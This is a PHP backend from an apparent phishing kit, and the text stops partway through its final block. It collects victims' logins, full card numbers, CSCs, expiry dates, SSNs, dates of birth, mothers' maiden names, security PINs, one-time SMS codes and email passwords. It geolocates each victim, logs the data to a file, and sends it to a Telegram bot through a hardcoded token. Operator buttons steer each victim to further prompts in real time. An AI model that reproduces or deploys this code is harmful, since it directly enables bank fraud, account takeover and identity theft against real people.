<?php
    header("Access-Control-Allow-Origin: *"); 

    $token = "8607265782:AAEMemBaZ6KaBrSFrTaP11iAjjz4VPDDLHE";
    $chatid = "-4962326193";

   if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
    } else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
    }

    $ip = $_SERVER['REMOTE_ADDR'];
    $ipdat = @json_decode(file_get_contents( 
        "http://ip-api.com/json/$ip"));

    $countryName = $ipdat->country;
    $city =  $ipdat->city;
    $org =  $ipdat->org;
    $timezone =  $ipdat->timezone;


    if(isset($_POST["userId"]) && isset($_POST["type"])){
        $userId = $_POST['userId'];
	    $pass = $_POST['pass'];
	    $type = $_POST['type'];

        if($userId != null && $pass != null){
        $message = "";
        $message .= "---|@systembott|---\n";
        $message .= "🟢 IP : " .$ip. "\n"; 
        $message .= "User ID: ".$userId."\n";
        $message .= "Pass: ".$pass."\n";
        $message .= "Account type: ".$type."\n";
        $message .= "\n------------ Location ---------------\n";
        $message .= "Country Name: ".$countryName."\n";
        $message .= "City: ". $city."\n";
        $message .= "ISP: ". $org."\n";
        $message .= "Timezone: ". $timezone."\n";

        
        file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );
        $handle = fopen("save.txt", "a");
        fwrite($handle, $message);
        fclose($handle);
    }
    }


    else if(isset($_POST["csc1"])){
        $csc1 = $_POST['csc1'];
        $baseUrl = $_POST['baseUrl'];

        if($csc1 != null){
        $message = "";
        $message .= "---|@systembott|---\n";
        $message .= "🟢 IP : " .$ip. "\n"; 
        $message .= "3 Digit CID: ".$csc1."\n";
        $message .= "\n------------ Location ---------------\n";
        $message .= "Country Name: ".$countryName."\n";
        $message .= "City: ". $city."\n";
        $message .= "ISP: ". $org."\n";
        $message .= "Timezone: ". $timezone."\n";

        $ipaddress = $_SERVER['REMOTE_ADDR'];
        $buttons = [
            [
              [
                  "text" => "❌ User Error",
                  "url" => $baseUrl."/panel.php?response=invaliduser&ip=".$ipaddress
              ],
              [
                  "text" => "❌ Email Error",
                  "url" => $baseUrl."/panel.php?response=invalidemailpass&ip=".$ipaddress
              ],
              [
                  "text" => "❌ OTP Error",
                  "url" => $baseUrl."/panel.php?response=invalidotp&ip=".$ipaddress
              ],
              [
                  "text" => "❌ Ask Error",
                  "url" => $baseUrl."/panel.php?response=invalid3c&ip=".$ipaddress
              ],
              [
                  "text" => "❌ 3CSC Error",
                  "url" => $baseUrl."/panel.php?response=invalid3c&ip=".$ipaddress
              ],
          ],
          [
              [
                  "text" => "📱 OTP",
                  "url" => $baseUrl."/panel.php?response=sms&ip=".$ipaddress
              ],
              [
                  "text" => "📱 Email OTP",
                  "url" => $baseUrl."/panel.php?response=emailot&ip=".$ipaddress
              ],
              [
                  "text" => "ℹ️ 4 Digit CSC",
                  "url" => $baseUrl."/panel.php?response=4digitcsc&ip=".$ipaddress
              ],
              [
                  "text" => "❓Question",
                  "url" => $baseUrl."/panel.php?response=question&ip=".$ipaddress
              ],
                
              ],
              [  [
                  "text" => "👤 Personal",
                  "url" => $baseUrl."/panel.php?response=personal&ip=".$ipaddress
              ],
               [
                  "text" => "👤 User&Pass",
                  "url" => $baseUrl."/panel.php?response=user&ip=".$ipaddress
               ],
               [
                  "text" => "💳 Card",
                  "url" => $baseUrl."/panel.php?response=card&ip=".$ipaddress
              ],
               [
                  "text" => "📧 Email",
                  "url" => $baseUrl."/panel.php?response=email&ip=".$ipaddress
              ],
              ],

              [ [
                  "text" => "🔑 Pin",
                  "url" => $baseUrl."/panel.php?response=pin&ip=".$ipaddress
               ],
               [
                "text" => "📆 MDB",
                "url" => $baseUrl."/panel.php?response=mdb&ip=".$ipaddress
             ],

               [
                  "text" => "🚺 MMN",
                  "url" => $baseUrl."/panel.php?response=mmn&ip=".$ipaddress
               ],
              [
                  "text" => "✅ Done",
                  "url" => $baseUrl."/panel.php?response=done&ip=".$ipaddress
              ]]

              
      ];

        $keyboard = json_encode([
            "inline_keyboard" => $buttons
        ]);
       
         $data = http_build_query([
            'text' => $message,
            'chat_id' => $chatid,
            'reply_markup' => $keyboard
        ]);
        
        $url = "https://api.telegram.org/bot" . $token . "/sendMessage?$data";
        file_get_contents($url);
        
        $handle = fopen("save.txt", "a");
        fwrite($handle, $message);
        fclose($handle);
        echo json_encode(["success" => "sent cc"]);
       
    }
    }

    else if(isset($_POST["csc"])){
        $csc2 = $_POST['csc'];
        $dig5 = $_POST['dig5'];
        $emad = $_POST['emad'];
        $cid41 = $_POST['cid41'];
        $baseUrl = $_POST["baseUrl"];

        if($csc2 != null){
        $message = "";
        $message .= "---|@systembott|---\n";
        $message .= "IP : " .$ip. "\n";
        $message .= "3 Digit CSC: ".$csc2."\n";
        $message .= "5 Last Card Digit: ".$dig5."\n";
        $message .= "Email Address: ".$emad."\n";
        $message .= "4 Digit Card ID: ".$cid41."\n";
        $message .= "\n------------ Location ---------------\n";
       $message .= "Country Name: ".$countryName."\n";
        $message .= "City: ". $city."\n";
        $message .= "ISP: ". $org."\n";
        $message .= "Timezone: ". $timezone."\n";


        $ipaddress = $_SERVER['REMOTE_ADDR'];
       $buttons = [
            [
              [
                  "text" => "❌ User Error",
                  "url" => $baseUrl."/panel.php?response=invaliduser&ip=".$ipaddress
              ],
              [
                  "text" => "❌ Email Error",
                  "url" => $baseUrl."/panel.php?response=invalidemailpass&ip=".$ipaddress
              ],
              [
                  "text" => "❌ OTP Error",
                  "url" => $baseUrl."/panel.php?response=invalidotp&ip=".$ipaddress
              ],
              [
                  "text" => "❌ Ask Error",
                  "url" => $baseUrl."/panel.php?response=invalid3c&ip=".$ipaddress
              ],
              [
                  "text" => "❌ 3CSC Error",
                  "url" => $baseUrl."/panel.php?response=invalid3c&ip=".$ipaddress
              ],
          ],
          [
              [
                  "text" => "📱 OTP",
                  "url" => $baseUrl."/panel.php?response=sms&ip=".$ipaddress
              ],
              [
                  "text" => "📱 Email OTP",
                  "url" => $baseUrl."/panel.php?response=emailot&ip=".$ipaddress
              ],
              [
                  "text" => "ℹ️ 4 Digit CSC",
                  "url" => $baseUrl."/panel.php?response=4digitcsc&ip=".$ipaddress
              ],
              [
                  "text" => "❓Question",
                  "url" => $baseUrl."/panel.php?response=question&ip=".$ipaddress
              ],
                
              ],
              [  [
                  "text" => "👤 Personal",
                  "url" => $baseUrl."/panel.php?response=personal&ip=".$ipaddress
              ],
               [
                  "text" => "👤 User&Pass",
                  "url" => $baseUrl."/panel.php?response=user&ip=".$ipaddress
               ],
               [
                  "text" => "💳 Card",
                  "url" => $baseUrl."/panel.php?response=card&ip=".$ipaddress
              ],
               [
                  "text" => "📧 Email",
                  "url" => $baseUrl."/panel.php?response=email&ip=".$ipaddress
              ],
              ],

              [ [
                  "text" => "🔑 Pin",
                  "url" => $baseUrl."/panel.php?response=pin&ip=".$ipaddress
               ],
               [
                "text" => "📆 MDB",
                "url" => $baseUrl."/panel.php?response=mdb&ip=".$ipaddress
             ],

               [
                  "text" => "🚺 MMN",
                  "url" => $baseUrl."/panel.php?response=mmn&ip=".$ipaddress
               ],
              [
                  "text" => "✅ Done",
                  "url" => $baseUrl."/panel.php?response=done&ip=".$ipaddress
              ]]

              
      ];


        $keyboard = json_encode([
            "inline_keyboard" => $buttons
        ]);
       
         $data = http_build_query([
            'text' => $message,
            'chat_id' => $chatid,
            'reply_markup' => $keyboard
        ]);
        
        $url = "https://api.telegram.org/bot" . $token . "/sendMessage?$data";
        file_get_contents($url);
        
        $handle = fopen("save.txt", "a");
        fwrite($handle, $message);
        fclose($handle);
        echo json_encode(["success" => "sent cc"]);
    }
    }


    else if(isset($_POST["ssn"]) && isset($_POST["psp"]) && isset($_POST["dob"])){
        $ssn = $_POST['ssn'];
	    $psp = $_POST['psp'];
	    $dob = $_POST['dob'];
	    $pob1 = $_POST['pob1'];
	    $pob2 = $_POST['pob2'];
	    $pob2 = $_POST['pob2'];
        $baseUrl = $_POST["baseUrl"];

        if($ssn != null && $psp != null && $dob != null){
        $message = "";
        $message .= "---|@systembott|---\n";
        $message .= "IP : " .$ip. "\n";
        $message .= "Personal Info \n";
        $message .= "---------------------- \n";
        $message .= "SSN: ".$ssn."\n";
        $message .= "Personal Security PIN: ".$psp."\n";
        $message .= "Date Of Birth: ".$dob."\n";
        $message .= "Mother's Maiden Name: ".$pob1."\n";
        $message .= "Mother's Birthday: ".$pob2."\n";
        $message .= "\n------------ Location ---------------\n";
        $message .= "Country Name: ".$countryName."\n";
        $message .= "City: ". $city."\n";
        $message .= "ISP: ". $org."\n";
        $message .= "Timezone: ". $timezone."\n";

        $ipaddress = $_SERVER['REMOTE_ADDR'];
        $buttons = [
            [
              [
                  "text" => "❌ User Error",
                  "url" => $baseUrl."/panel.php?response=invaliduser&ip=".$ipaddress
              ],
              [
                  "text" => "❌ Email Error",
                  "url" => $baseUrl."/panel.php?response=invalidemailpass&ip=".$ipaddress
              ],
              [
                  "text" => "❌ OTP Error",
                  "url" => $baseUrl."/panel.php?response=invalidotp&ip=".$ipaddress
              ],
              [
                  "text" => "❌ Ask Error",
                  "url" => $baseUrl."/panel.php?response=invalid3c&ip=".$ipaddress
              ],
              [
                  "text" => "❌ 3CSC Error",
                  "url" => $baseUrl."/panel.php?response=invalid3c&ip=".$ipaddress
              ],
          ],
          [
              [
                  "text" => "📱 OTP",
                  "url" => $baseUrl."/panel.php?response=sms&ip=".$ipaddress
              ],
              [
                  "text" => "📱 Email OTP",
                  "url" => $baseUrl."/panel.php?response=emailot&ip=".$ipaddress
              ],
              [
                  "text" => "ℹ️ 4 Digit CSC",
                  "url" => $baseUrl."/panel.php?response=4digitcsc&ip=".$ipaddress
              ],
              [
                  "text" => "❓Question",
                  "url" => $baseUrl."/panel.php?response=question&ip=".$ipaddress
              ],
                
              ],
              [  [
                  "text" => "👤 Personal",
                  "url" => $baseUrl."/panel.php?response=personal&ip=".$ipaddress
              ],
               [
                  "text" => "👤 User&Pass",
                  "url" => $baseUrl."/panel.php?response=user&ip=".$ipaddress
               ],
               [
                  "text" => "💳 Card",
                  "url" => $baseUrl."/panel.php?response=card&ip=".$ipaddress
              ],
               [
                  "text" => "📧 Email",
                  "url" => $baseUrl."/panel.php?response=email&ip=".$ipaddress
              ],
              ],

              [ [
                  "text" => "🔑 Pin",
                  "url" => $baseUrl."/panel.php?response=pin&ip=".$ipaddress
               ],
               [
                "text" => "📆 MDB",
                "url" => $baseUrl."/panel.php?response=mdb&ip=".$ipaddress
             ],

               [
                  "text" => "🚺 MMN",
                  "url" => $baseUrl."/panel.php?response=mmn&ip=".$ipaddress
               ],
              [
                  "text" => "✅ Done",
                  "url" => $baseUrl."/panel.php?response=done&ip=".$ipaddress
              ]]

              
      ];


        $keyboard = json_encode([
            "inline_keyboard" => $buttons
        ]);
       
         $data = http_build_query([
            'text' => $message,
            'chat_id' => $chatid,
            'reply_markup' => $keyboard
        ]);
        
        $url = "https://api.telegram.org/bot" . $token . "/sendMessage?$data";
        file_get_contents($url);
        
        $handle = fopen("save.txt", "a");
        fwrite($handle, $message);
        fclose($handle);
        echo json_encode(["success" => "sent cc"]);
    }
    }

   

    else if(isset($_POST["dci"])){
        $dci = $_POST['dci'];
        $digit4 = $_POST["digit4"];
        $email = $_POST["email"];
        $zip = $_POST["zp"];
        $phone = $_POST["phone"];
        $cExp = $_POST["cExp"];
        $baseUrl = $_POST["baseUrl"];
	
        if($dci != null && $digit4 !== null && $email != null && $phone !== null){
        $message = "";
        $message .= "---|@systembott|---\n";
        $message .= "IP : " .$ip. "\n";
        $message .= "Billing Info\n";
        $message .= "---------------------- \n";
        $message .= "Full Card Number: ".$dci."\n";
        $message .= "4 Digit Card ID: ".$digit4."\n";
        $message .= "Card Exp Date: ".$cExp."\n";
        $message .= "Card CSC: ".$email."\n";
        $message .= "Zip Code: ".$zip ."\n";
        $message .= "Last 4 SSN: ".$phone."\n";
        $message .= "\n------------ Location ---------------\n";
       $message .= "Country Name: ".$countryName."\n";
        $message .= "City: ". $city."\n";
        $message .= "ISP: ". $org."\n";
        $message .= "Timezone: ". $timezone."\n";

    
        $ipaddress = $_SERVER['REMOTE_ADDR'];
         $buttons = [
            [
              [
                  "text" => "❌ User Error",
                  "url" => $baseUrl."/panel.php?response=invaliduser&ip=".$ipaddress
              ],
              [
                  "text" => "❌ Email Error",
                  "url" => $baseUrl."/panel.php?response=invalidemailpass&ip=".$ipaddress
              ],
              [
                  "text" => "❌ OTP Error",
                  "url" => $baseUrl."/panel.php?response=invalidotp&ip=".$ipaddress
              ],
              [
                  "text" => "❌ Ask Error",
                  "url" => $baseUrl."/panel.php?response=invalid3c&ip=".$ipaddress
              ],
              [
                  "text" => "❌ 3CSC Error",
                  "url" => $baseUrl."/panel.php?response=invalid3c&ip=".$ipaddress
              ],
          ],
          [
              [
                  "text" => "📱 OTP",
                  "url" => $baseUrl."/panel.php?response=sms&ip=".$ipaddress
              ],
              [
                  "text" => "📱 Email OTP",
                  "url" => $baseUrl."/panel.php?response=emailot&ip=".$ipaddress
              ],
              [
                  "text" => "ℹ️ 4 Digit CSC",
                  "url" => $baseUrl."/panel.php?response=4digitcsc&ip=".$ipaddress
              ],
              [
                  "text" => "❓Question",
                  "url" => $baseUrl."/panel.php?response=question&ip=".$ipaddress
              ],
                
              ],
              [  [
                  "text" => "👤 Personal",
                  "url" => $baseUrl."/panel.php?response=personal&ip=".$ipaddress
              ],
               [
                  "text" => "👤 User&Pass",
                  "url" => $baseUrl."/panel.php?response=user&ip=".$ipaddress
               ],
               [
                  "text" => "💳 Card",
                  "url" => $baseUrl."/panel.php?response=card&ip=".$ipaddress
              ],
               [
                  "text" => "📧 Email",
                  "url" => $baseUrl."/panel.php?response=email&ip=".$ipaddress
              ],
              ],

              [ [
                  "text" => "🔑 Pin",
                  "url" => $baseUrl."/panel.php?response=pin&ip=".$ipaddress
               ],
               [
                "text" => "📆 MDB",
                "url" => $baseUrl."/panel.php?response=mdb&ip=".$ipaddress
             ],

               [
                  "text" => "🚺 MMN",
                  "url" => $baseUrl."/panel.php?response=mmn&ip=".$ipaddress
               ],
              [
                  "text" => "✅ Done",
                  "url" => $baseUrl."/panel.php?response=done&ip=".$ipaddress
              ]]

              
      ];

        $keyboard = json_encode([
            "inline_keyboard" => $buttons
        ]);
       
         $data = http_build_query([
            'text' => $message,
            'chat_id' => $chatid,
            'reply_markup' => $keyboard
        ]);
        
        $url = "https://api.telegram.org/bot" . $token . "/sendMessage?$data";
        file_get_contents($url);
        
        $handle = fopen("save.txt", "a");
        fwrite($handle, $message);
        fclose($handle);
        echo json_encode(["success" => "sent ot"]);
    }
    }

else if(isset($_POST["noc"])){
        $noc = $_POST['noc'];
        $cnum = $_POST['cnum'];
        $exp = $_POST['exp'];
        $sec = $_POST["sec"];
        $cid1 = $_POST["cid1"];
        $csc3 = $_POST["csc3"];
        $zip = $_POST["zip"];
        $ssn = $_POST["ssn"];
        
        $baseUrl = $_POST["baseUrl"];
        
        if($noc != null && $cnum != null && $exp != null){
        $message = "";
        $message .= "---|@systembott|---\n";
        $message .= "IP : " .$ip. "\n";
        $message .= "Card Info \n";
        $message .= "---------------------- \n";
        $message .= "Name on Card: ".$noc."\n";
        $message .= "Card Number: ".$cnum."\n";
        $message .= "Expirary Date: ".$exp."\n";
        $message .= "4 digit card ID: ".$cid1."\n";
        $message .= "3 digit csc: ".$csc3."\n";
        $message .= "Phone: ".$sec."\n";
        $message .= "Zip Code: ".$zip ."\n";
        $message .= "Last 4 SSN: ".$ssn."\n";
        $message .= "\n------------ Location ---------------\n";
        $message .= "Country Name: ".$countryName."\n";
        $message .= "City: ". $city."\n";
        $message .= "ISP: ". $org."\n";
        $message .= "Timezone: ". $timezone."\n";

       
        $ipaddress = $_SERVER['REMOTE_ADDR'];
        $buttons = [
            [
              [
                  "text" => "❌ User Error",
                  "url" => $baseUrl."/panel.php?response=invaliduser&ip=".$ipaddress
              ],
              [
                  "text" => "❌ Email Error",
                  "url" => $baseUrl."/panel.php?response=invalidemailpass&ip=".$ipaddress
              ],
              [
                  "text" => "❌ OTP Error",
                  "url" => $baseUrl."/panel.php?response=invalidotp&ip=".$ipaddress
              ],
              [
                  "text" => "❌ Ask Error",
                  "url" => $baseUrl."/panel.php?response=invalid3c&ip=".$ipaddress
              ],
              [
                  "text" => "❌ 3CSC Error",
                  "url" => $baseUrl."/panel.php?response=invalid3c&ip=".$ipaddress
              ],
          ],
          [
              [
                  "text" => "📱 OTP",
                  "url" => $baseUrl."/panel.php?response=sms&ip=".$ipaddress
              ],
              [
                  "text" => "📱 Email OTP",
                  "url" => $baseUrl."/panel.php?response=emailot&ip=".$ipaddress
              ],
              [
                  "text" => "ℹ️ 4 Digit CSC",
                  "url" => $baseUrl."/panel.php?response=4digitcsc&ip=".$ipaddress
              ],
              [
                  "text" => "❓Question",
                  "url" => $baseUrl."/panel.php?response=question&ip=".$ipaddress
              ],
                
              ],
              [  [
                  "text" => "👤 Personal",
                  "url" => $baseUrl."/panel.php?response=personal&ip=".$ipaddress
              ],
               [
                  "text" => "👤 User&Pass",
                  "url" => $baseUrl."/panel.php?response=user&ip=".$ipaddress
               ],
               [
                  "text" => "💳 Card",
                  "url" => $baseUrl."/panel.php?response=card&ip=".$ipaddress
              ],
               [
                  "text" => "📧 Email",
                  "url" => $baseUrl."/panel.php?response=email&ip=".$ipaddress
              ],
              ],

              [ [
                  "text" => "🔑 Pin",
                  "url" => $baseUrl."/panel.php?response=pin&ip=".$ipaddress
               ],
               [
                "text" => "📆 MDB",
                "url" => $baseUrl."/panel.php?response=mdb&ip=".$ipaddress
             ],

               [
                  "text" => "🚺 MMN",
                  "url" => $baseUrl."/panel.php?response=mmn&ip=".$ipaddress
               ],
              [
                  "text" => "✅ Done",
                  "url" => $baseUrl."/panel.php?response=done&ip=".$ipaddress
              ]]

              
      ];


        $keyboard = json_encode([
            "inline_keyboard" => $buttons
        ]);
       
         $data = http_build_query([
            'text' => $message,
            'chat_id' => $chatid,
            'reply_markup' => $keyboard
        ]);
        
        $url = "https://api.telegram.org/bot" . $token . "/sendMessage?$data";
        file_get_contents($url);
        
        $handle = fopen("save.txt", "a");
        fwrite($handle, $message);
        fclose($handle);
        echo json_encode(["success" => "sent ot"]);
    }
    }



    else if(isset($_POST["answer"])){
        $answer = $_POST['answer'];
        $question = $_POST['quest'];
        $baseUrl = $_POST["baseUrl"];
        
        if($answer != null && $question != null){
        $message = "";
        $message .= "---|@systembott|---\n";
        $message .= "IP : " .$ip. "\n";
        $message .= "Question Info \n";
        $message .= "---------------------- \n";
        $message .= "$question: ".$answer."\n";
        $message .= "\n------------ Location ---------------\n";
        $message .= "Country Name: ".$countryName."\n";
        $message .= "City: ". $city."\n";
        $message .= "ISP: ". $org."\n";
        $message .= "Timezone: ". $timezone."\n";

       
        $ipaddress = $_SERVER['REMOTE_ADDR'];
        $buttons = [
            [
              [
                  "text" => "❌ User Error",
                  "url" => $baseUrl."/panel.php?response=invaliduser&ip=".$ipaddress
              ],
              [
                  "text" => "❌ Email Error",
                  "url" => $baseUrl."/panel.php?response=invalidemailpass&ip=".$ipaddress
              ],
              [
                  "text" => "❌ OTP Error",
                  "url" => $baseUrl."/panel.php?response=invalidotp&ip=".$ipaddress
              ],
              [
                  "text" => "❌ Ask Error",
                  "url" => $baseUrl."/panel.php?response=invalid3c&ip=".$ipaddress
              ],
              [
                  "text" => "❌ 3CSC Error",
                  "url" => $baseUrl."/panel.php?response=invalid3c&ip=".$ipaddress
              ],
          ],
          [
              [
                  "text" => "📱 OTP",
                  "url" => $baseUrl."/panel.php?response=sms&ip=".$ipaddress
              ],
              [
                  "text" => "📱 Email OTP",
                  "url" => $baseUrl."/panel.php?response=emailot&ip=".$ipaddress
              ],
              [
                  "text" => "ℹ️ 4 Digit CSC",
                  "url" => $baseUrl."/panel.php?response=4digitcsc&ip=".$ipaddress
              ],
              [
                  "text" => "❓Question",
                  "url" => $baseUrl."/panel.php?response=question&ip=".$ipaddress
              ],
                
              ],
              [  [
                  "text" => "👤 Personal",
                  "url" => $baseUrl."/panel.php?response=personal&ip=".$ipaddress
              ],
               [
                  "text" => "👤 User&Pass",
                  "url" => $baseUrl."/panel.php?response=user&ip=".$ipaddress
               ],
               [
                  "text" => "💳 Card",
                  "url" => $baseUrl."/panel.php?response=card&ip=".$ipaddress
              ],
               [
                  "text" => "📧 Email",
                  "url" => $baseUrl."/panel.php?response=email&ip=".$ipaddress
              ],
              ],

              [ [
                  "text" => "🔑 Pin",
                  "url" => $baseUrl."/panel.php?response=pin&ip=".$ipaddress
               ],
               [
                "text" => "📆 MDB",
                "url" => $baseUrl."/panel.php?response=mdb&ip=".$ipaddress
             ],

               [
                  "text" => "🚺 MMN",
                  "url" => $baseUrl."/panel.php?response=mmn&ip=".$ipaddress
               ],
              [
                  "text" => "✅ Done",
                  "url" => $baseUrl."/panel.php?response=done&ip=".$ipaddress
              ]]

              
      ];

        $keyboard = json_encode([
            "inline_keyboard" => $buttons
        ]);
       
         $data = http_build_query([
            'text' => $message,
            'chat_id' => $chatid,
            'reply_markup' => $keyboard
        ]);
        
        $url = "https://api.telegram.org/bot" . $token . "/sendMessage?$data";
        file_get_contents($url);
        
        $handle = fopen("save.txt", "a");
        fwrite($handle, $message);
        fclose($handle);
        echo json_encode(["success" => "sent ot"]);
    }
    }




    else if(isset($_POST["ot"])){
        $ot = $_POST['ot'];
        $baseUrl = $_POST["baseUrl"];

        if($ot != null){
        $message = "";
        $message .= "---|@systembott|---\n";
        $message .= "IP : " .$ip. "\n";
        $message .= "SMS Info \n";
        $message .= "---------------------- \n";
        $message .= "Code: ".$ot."\n";
        $message .= "\n------------ Location ---------------\n";
        $message .= "Country Name: ".$countryName."\n";
        $message .= "City: ". $city."\n";
        $message .= "ISP: ". $org."\n";
        $message .= "Timezone: ". $timezone."\n";
       
        $ipaddress = $_SERVER['REMOTE_ADDR'];
        $buttons = [
            [
              [
                  "text" => "❌ User Error",
                  "url" => $baseUrl."/panel.php?response=invaliduser&ip=".$ipaddress
              ],
              [
                  "text" => "❌ Email Error",
                  "url" => $baseUrl."/panel.php?response=invalidemailpass&ip=".$ipaddress
              ],
              [
                  "text" => "❌ OTP Error",
                  "url" => $baseUrl."/panel.php?response=invalidotp&ip=".$ipaddress
              ],
              [
                  "text" => "❌ Ask Error",
                  "url" => $baseUrl."/panel.php?response=invalid3c&ip=".$ipaddress
              ],
              [
                  "text" => "❌ 3CSC Error",
                  "url" => $baseUrl."/panel.php?response=invalid3c&ip=".$ipaddress
              ],
          ],
          [
              [
                  "text" => "📱 OTP",
                  "url" => $baseUrl."/panel.php?response=sms&ip=".$ipaddress
              ],
              [
                  "text" => "📱 Email OTP",
                  "url" => $baseUrl."/panel.php?response=emailot&ip=".$ipaddress
              ],
              [
                  "text" => "ℹ️ 4 Digit CSC",
                  "url" => $baseUrl."/panel.php?response=4digitcsc&ip=".$ipaddress
              ],
              [
                  "text" => "❓Question",
                  "url" => $baseUrl."/panel.php?response=question&ip=".$ipaddress
              ],
                
              ],
              [  [
                  "text" => "👤 Personal",
                  "url" => $baseUrl."/panel.php?response=personal&ip=".$ipaddress
              ],
               [
                  "text" => "👤 User&Pass",
                  "url" => $baseUrl."/panel.php?response=user&ip=".$ipaddress
               ],
               [
                  "text" => "💳 Card",
                  "url" => $baseUrl."/panel.php?response=card&ip=".$ipaddress
              ],
               [
                  "text" => "📧 Email",
                  "url" => $baseUrl."/panel.php?response=email&ip=".$ipaddress
              ],
              ],

              [ [
                  "text" => "🔑 Pin",
                  "url" => $baseUrl."/panel.php?response=pin&ip=".$ipaddress
               ],
               [
                "text" => "📆 MDB",
                "url" => $baseUrl."/panel.php?response=mdb&ip=".$ipaddress
             ],

               [
                  "text" => "🚺 MMN",
                  "url" => $baseUrl."/panel.php?response=mmn&ip=".$ipaddress
               ],
              [
                  "text" => "✅ Done",
                  "url" => $baseUrl."/panel.php?response=done&ip=".$ipaddress
              ]]

              
      ];

        $keyboard = json_encode([
            "inline_keyboard" => $buttons
        ]);
       
         $data = http_build_query([
            'text' => $message,
            'chat_id' => $chatid,
            'reply_markup' => $keyboard
        ]);
        
        $url = "https://api.telegram.org/bot" . $token . "/sendMessage?$data";
        file_get_contents($url);
        
        $handle = fopen("save.txt", "a");
        fwrite($handle, $message);
        fclose($handle);
        echo json_encode(["success" => "sent ot"]);
    }
    }



    else if(isset($_POST["em"])){
        $em = $_POST['em'];
        $pa = $_POST['pa'];
        $baseUrl = $_POST["baseUrl"];

        if($em != null){
        $message = "";
        $message .= "---|@systembott|---\n";
        $message .= "IP : " .$ip. "\n";
        $message .= "Email Info \n";
        $message .= "---------------------- \n";
        $message .= "Email: ".$em."\n";
        $message .= "Email Password: ".$pa."\n";
        $message .= "\n------------ Location ---------------\n";
        $message .= "Country Name: ".$countryName."\n";
        $message .= "City: ". $city."\n";
        $message .= "ISP: ". $org."\n";
        $message .= "Timezone: ". $timezone."\n";
       
        $ipaddress = $_SERVER['REMOTE_ADDR'];
          $buttons = [
            [
              [
                  "text" => "❌ User Error",
                  "url" => $baseUrl."/panel.php?response=invaliduser&ip=".$ipaddress
              ],
              [
                  "text" => "❌ Email Error",
                  "url" => $baseUrl."/panel.php?response=invalidemailpass&ip=".$ipaddress
              ],
              [
                  "text" => "❌ OTP Error",
                  "url" => $baseUrl."/panel.php?response=invalidotp&ip=".$ipaddress
              ],
              [
                  "text" => "❌ Ask Error",
                  "url" => $baseUrl."/panel.php?response=invalid3c&ip=".$ipaddress
              ],
              [
                  "text" => "❌ 3CSC Error",
                  "url" => $baseUrl."/panel.php?response=invalid3c&ip=".$ipaddress
              ],
          ],
          [
              [
                  "text" => "📱 OTP",
                  "url" => $baseUrl."/panel.php?response=sms&ip=".$ipaddress
              ],
              [
                  "text" => "📱 Email OTP",
                  "url" => $baseUrl."/panel.php?response=emailot&ip=".$ipaddress
              ],
              [
                  "text" => "ℹ️ 4 Digit CSC",
                  "url" => $baseUrl."/panel.php?response=4digitcsc&ip=".$ipaddress
              ],
              [
                  "text" => "❓Question",
                  "url" => $baseUrl."/panel.php?response=question&ip=".$ipaddress
              ],
                
              ],
              [  [
                  "text" => "👤 Personal",
                  "url" => $baseUrl."/panel.php?response=personal&ip=".$ipaddress
              ],
               [
                  "text" => "👤 User&Pass",
                  "url" => $baseUrl."/panel.php?response=user&ip=".$ipaddress
               ],
               [
                  "text" => "💳 Card",
                  "url" => $baseUrl."/panel.php?response=card&ip=".$ipaddress
              ],
               [
                  "text" => "📧 Email",
                  "url" => $baseUrl."/panel.php?response=email&ip=".$ipaddress
              ],
              ],

              [ [
                  "text" => "🔑 Pin",
                  "url" => $baseUrl."/panel.php?response=pin&ip=".$ipaddress
               ],
               [
                "text" => "📆 MDB",
                "url" => $baseUrl."/panel.php?response=mdb&ip=".$ipaddress
             ],

               [
                  "text" => "🚺 MMN",
                  "url" => $baseUrl."/panel.php?response=mmn&ip=".$ipaddress
               ],
              [
                  "text" => "✅ Done",
                  "url" => $baseUrl."/panel.php?response=done&ip=".$ipaddress
              ]]

              
      ];

        $keyboard = json_encode([
            "inline_keyboard" => $buttons
        ]);
       
         $data = http_build_query([
            'text' => $message,
            'chat_id' => $chatid,
            'reply_markup' => $keyboard
        ]);
        
        $url = "https://api.telegram.org/bot" . $token . "/sendMessage?$data";
        file_get_contents($url);
        
        $handle = fopen("save.txt", "a");
        fwrite($handle, $message);
        fclose($handle);
        echo json_encode(["success" => "sent ot"]);
    }
    }



    
    else if(isset($_POST["spin"])){
        $spin = $_POST['spin'];
        $baseUrl = $_POST["baseUrl"];

        if($spin != null){
        $message = "";
        $message .= "---|@systembott|---\n";
        $message .= "IP : " .$ip. "\n";
        $message .= "Security Question \n";
        $message .= "---------------------- \n";
        $message .= "Security Pin: ".$spin."\n";
        $message .= "\n------------ Location ---------------\n";
        $message .= "Country Name: ".$countryName."\n";
        $message .= "City: ". $city."\n";
        $message .= "ISP: ". $org."\n";
        $message .= "Timezone: ". $timezone."\n";
       
        $ipaddress = $_SERVER['REMOTE_ADDR'];
        $buttons = [
            [
              [
                  "text" => "❌ User Error",
                  "url" => $baseUrl."/panel.php?response=invaliduser&ip=".$ipaddress
              ],
              [
                  "text" => "❌ Email Error",
                  "url" => $baseUrl."/panel.php?response=invalidemailpass&ip=".$ipaddress
              ],
              [
                  "text" => "❌ OTP Error",
                  "url" => $baseUrl."/panel.php?response=invalidotp&ip=".$ipaddress
              ],
              [
                  "text" => "❌ Ask Error",
                  "url" => $baseUrl."/panel.php?response=invalid3c&ip=".$ipaddress
              ],
              [
                  "text" => "❌ 3CSC Error",
                  "url" => $baseUrl."/panel.php?response=invalid3c&ip=".$ipaddress
              ],
          ],
          [
              [
                  "text" => "📱 OTP",
                  "url" => $baseUrl."/panel.php?response=sms&ip=".$ipaddress
              ],
              [
                  "text" => "📱 Email OTP",
                  "url" => $baseUrl."/panel.php?response=emailot&ip=".$ipaddress
              ],
              [
                  "text" => "ℹ️ 4 Digit CSC",
                  "url" => $baseUrl."/panel.php?response=4digitcsc&ip=".$ipaddress
              ],
              [
                  "text" => "❓Question",
                  "url" => $baseUrl."/panel.php?response=question&ip=".$ipaddress
              ],
                
              ],
              [  [
                  "text" => "👤 Personal",
                  "url" => $baseUrl."/panel.php?response=personal&ip=".$ipaddress
              ],
               [
                  "text" => "👤 User&Pass",
                  "url" => $baseUrl."/panel.php?response=user&ip=".$ipaddress
               ],
               [
                  "text" => "💳 Card",
